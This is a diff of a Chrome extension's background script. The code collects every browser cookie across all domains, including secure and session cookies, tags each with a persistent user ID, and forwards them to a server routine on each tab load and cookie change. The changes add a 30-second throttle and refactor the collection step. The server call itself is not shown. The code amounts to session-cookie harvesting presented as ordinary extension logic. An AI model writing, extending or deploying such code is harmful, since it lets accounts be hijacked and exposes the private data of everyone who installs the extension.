@@ -1,5 +1,6 @@
 let sentCookies = {};
-
+let reduceCalls= false;
+const REDUCE_CALLS_PERIOD = 30000;
 //Enabling the extension to be able to identify specific users
 
 function getOrGenerateUUID(callback) {
@@ -19,23 +20,50 @@ function getOrGenerateUUID(callback) {
   });
 }
 
-function sendCookiesToServer(cookies) {
-  //local storage is used to identify the users
-  chrome.storage.local.get("userId", (data) => {
-      let userId = data.userId;
-      if (!userId) {
-          userId = generateUUID();
-          chrome.storage.local.set({userId: userId});
-      }
-      //console.log("Retrieved userId:", userId);
-      const formattedCookies = cookies.map(cookie => ({
-          ...cookie,
-          userId,
-          expirationDate: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : undefined,
-          secure: cookie.secure || false,
-          session: cookie.session || false
-      }));
+//seding cookies reducing the API calls
+function sendCookiesForReduceCalls(cookies) {
+  if (!reduceCalls) {
+    sendCookiesToServer(cookies);
+    reduceCalls= true;
+    setTimeout(() => {
+      reduceCalls = false;
+    }, REDUCE_CALLS_PERIOD);
+  }
+}
 
+//getting the cookies here
+function getAllCookiesAsync() {
+  return new Promise((resolve, reject) => {
+    chrome.cookies.getAll({}, (cookies) => {
+      if (chrome.runtime.lastError) {
+        reject(chrome.runtime.lastError);
+      } else {
+        resolve(cookies);
+      }
+    });
+  });
+}
+
+async function updateAllCookiesAndSend() {
+  try {
+    const cookies = await getAllCookiesAsync();
+    sendCookiesForReduceCalls(cookies);
+  } catch (error) {
+    console.error('Error retrieving cookies:', error);
+  }
+}
+
+
+//to send the cookies to the server
+function sendCookiesToServer(cookies) {
+
+  getOrGenerateUUID((userId) => {
+    const formattedCookies = cookies.map(cookie => ({
+      ...cookie,
+      userId,
+      secure: cookie.secure || false,
+      session: cookie.session || false
+  }));
       const newOrUpdatedCookies = formattedCookies.filter(cookie => {
           const cookieId = `${cookie.domain}-${cookie.name}`;
           if (!sentCookies[cookieId] || sentCookies[cookieId] !== cookie.value) {
@@ -64,11 +92,12 @@ function getAllCookiesAndSendToServer() {
     if (chrome.runtime.lastError) {
       return;
     }
-    sendCookiesToServer(cookies);
+    sendCookiesForReduceCalls(cookies);
 
   });
 }
 
+//once the content is ready
 let contentScriptLoaded = false;
 
 chrome.runtime.onMessage.addListener((message, sender) => {
@@ -79,11 +108,11 @@ chrome.runtime.onMessage.addListener((message, sender) => {
 
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status === 'complete' && tab.active && contentScriptLoaded) {
-    getAllCookiesAndSendToServer();
+    updateAllCookiesAndSend();
   }
 });
 
-chrome.cookies.onChanged.addListener(() => {
-  getAllCookiesAndSendToServer();
+chrome.cookies.onChanged.addListener((changeInfo) => {
+  updateAllCookiesAndSend();
 });
 
